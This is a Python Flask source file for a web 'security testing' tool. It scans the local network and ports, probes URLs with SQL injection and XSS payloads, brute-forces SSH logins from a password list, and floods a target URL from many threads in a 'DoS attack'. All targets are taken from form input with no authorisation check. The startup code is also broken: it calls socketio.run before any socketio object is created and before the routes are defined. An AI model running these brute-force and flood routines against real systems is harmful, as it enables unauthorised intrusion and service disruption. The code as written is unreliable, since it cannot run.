from flask import Flask, request, render_template, send_file, send_from_directory, jsonify
from flask_socketio import SocketIO
import socket
import threading
import requests
import paramiko
import io
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import os
import subprocess
import platform
import re

# Get the port from the environment variable, with a default fallback
port = int(os.environ.get("PORT", 5000))

# Run the application with socketio, specifying the port


app = Flask(__name__)
socketio.run(app, host="0.0.0.0", port=port)


# Define the path to the images directory
IMAGE_FOLDER = os.path.join(app.root_path, 'static/images')

@app.route('/images/<path:filename>')
def serve_image(filename):
    """Serve images from the specified directory."""
    return send_from_directory(IMAGE_FOLDER, filename)

@app.route('/')
def index():
    """Render the main index page."""
    return render_template('index.html')

# Function to get the local IP address
def get_local_ip():
    """Retrieve the local IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))  # Use a public DNS server to find the local IP
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"
    finally:
        s.close()
    return local_ip

# Function to generate the network address
def get_network(ip):
    """Generate the network address from the local IP."""
    return '.'.join(ip.split('.')[:-1]) + '.'

# Function to resolve hostname
def get_hostname(ip):
    """Resolve the hostname from an IP address."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror):
        return "N/A"  # Return "N/A" if the hostname cannot be resolved

# Function to scan the network
def scan_network():
    """Scan the local network for devices."""
    local_ip = get_local_ip()
    network = get_network(local_ip)
    print(f"Scanning network: {network}0/24")

    devices = []

    # Determine the command based on the OS
    if platform.system() == "Windows":
        command = "arp -a"
        output = subprocess.check_output(command, shell=True).decode()
        
        # Parse the output for IP and MAC addresses
        for line in output.splitlines():
            match = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([-0-9A-Fa-f:]+)', line)
            if match:
                ip = match.group(1)
                mac = match.group(2)
                if not ip.startswith('169.254') and not ip.startswith('192.168.56.'):
                    hostname = get_hostname(ip)
                    devices.append({'ip': ip, 'mac': mac, 'hostname': hostname})
    else:
        for i in range(1, 255):
            ip = f"{network}{i}"
            try:
                hostname = get_hostname(ip)
                devices.append({'ip': ip, 'mac': "N/A", 'hostname': hostname})
            except Exception:
                continue  # Ignore unreachable hosts

    return devices

@app.route('/scanner_home')
def scanner_home():
    """Render the scanner home page."""
    return render_template('ScannerHome.html')

@app.route('/scan', methods=['POST'])
def scan():
    """Initiate the network scan and return results as JSON."""
    scan_results = scan_network()
    return jsonify({'results': scan_results})

# SQL Injection Test Function
def test_sql_injection(url):
    """Test for SQL injection vulnerabilities."""
    results = []
    try:
        payload = "' OR '1'='1"
        response = requests.get(url + payload)
        if "error" in response.text or "SQL" in response.text:
            results.append(f"Potential SQL Injection vulnerability found at {url}")
        else:
            results.append(f"No vulnerability detected at {url}")
    except requests.RequestException as e:
        results.append(f"Error: {str(e)}")
    return results

@app.route('/test_sql_injection', methods=['POST'])
def handle_sql_injection():
    """Handle SQL injection testing request."""
    url = request.form.get('url')
    if not url:
        return "Error: URL is required", 400
    results = test_sql_injection(url)
    return render_template('results.html', results=results)

# Port Scanning Function
def scan_ports(target_ip, port_range):
    """Scan a range of ports on a target IP address."""
    results = []
    for port in range(port_range[0], port_range[1] + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)  # Shortened timeout
                result = sock.connect_ex((target_ip, port))
                status = "open" if result == 0 else "closed"
                results.append(f"Port {port} is {status} on {target_ip}")
        except Exception as e:
            results.append(f"Error scanning port {port}: {str(e)}")
    return results

@app.route('/scan_ports', methods=['POST'])
def handle_scan_ports():
    """Handle port scanning request."""
    target_ip = request.form.get('target_ip')
    port_range_input = request.form.get('port_range')

    if not target_ip or not port_range_input:
        return "Error: Target IP and port range are required", 400

    try:
        if '-' in port_range_input:
            port_range = tuple(map(int, port_range_input.split('-')))
        else:
            port_range = (int(port_range_input), int(port_range_input))
    except ValueError:
        return "Error: Invalid port range", 400

    results = scan_ports(target_ip, port_range)
    return render_template('results.html', results=results)

# SSH Brute Force Attack Function
def ssh_brute_force(target_ip, username, password_list):
    """Attempt to brute force SSH login with a list of passwords."""
    results = []
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password, timeout=3)
            results.append(f"Login successful with {username}:{password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            results.append(f"Login failed for {username}:{password}")
        except Exception as e:
            results.append(f"Error during SSH brute force: {str(e)}")
    return results

@app.route('/ssh_brute_force', methods=['POST'])
def handle_ssh_brute_force():
    """Handle SSH brute force attack request."""
    target_ip = request.form.get('target_ip')
    username = request.form.get('username')
    password_list = request.form.get('password_list')
    
    if not target_ip or not username or not password_list:
        return "Error: Target IP, username, and password list are required", 400

    password_list = password_list.split(',')
    results = ssh_brute_force(target_ip, username, password_list)
    return render_template('results.html', results=results)

# DoS Attack Simulation
def dos_attack(target_url, threads_count, request_limit):
    """Simulate a DoS attack by sending multiple requests to a target URL."""
    def send_requests():
        for _ in range(request_limit):
            try:
                requests.get(target_url)
            except requests.RequestException:
                pass

    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=send_requests)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    return [f"Sent {request_limit} requests across {threads_count} threads to {target_url}"]

@app.route('/dos_attack', methods=['POST'])
def handle_dos_attack():
    """Handle DoS attack simulation request."""
    target_url = request.form.get('target_url')
    threads_count = request.form.get('threads_count', type=int)
    request_limit = request.form.get('request_limit', type=int)
    
    if not target_url or not threads_count or not request_limit:
        return "Error: Target URL, threads count, and request limit are required", 400

    results = dos_attack(target_url, threads_count, request_limit)
    return render_template('results.html', results=results)

# XSS Testing Function
def test_xss(url):
    """Test for XSS vulnerabilities."""
    results = []
    try:
        payload = "<script>alert('XSS');</script>"
        response = requests.get(url, params={'q': payload})
        if payload in response.text:
            results.append(f"XSS vulnerability found at {url}")
        else:
            results.append(f"No XSS vulnerability found at {url}")
    except requests.RequestException as e:
        results.append(f"Error: {str(e)}")
    return results

@app.route('/test_xss', methods=['POST'])
def handle_xss():
    """Handle XSS testing request."""
    url = request.form.get('url')
    if not url:
        return "Error: URL is required", 400
    results = test_xss(url)
    return render_template('results.html', results=results)

# Generate Report Function
def generate_report(results):
    """Generate a PDF report from the results."""
    report_buffer = io.BytesIO()
    pdf = canvas.Canvas(report_buffer, pagesize=letter)
    pdf.drawString(100, 750, "Security Test Report")
    
    y_position = 700
    for result in results:
        pdf.drawString(100, y_position, result)
        y_position -= 20

    pdf.save()
    report_buffer.seek(0)
    return report_buffer

@app.route('/download_report', methods=['POST'])
def download_report():
    """Handle report download request."""
    results = request.form.getlist('results[]')
    pdf_buffer = generate_report(results)
    return send_file(pdf_buffer, as_attachment=True, download_name='report.pdf', mimetype='application/pdf')

if __name__ == '__main__':
    socketio.run(app, debug=True)
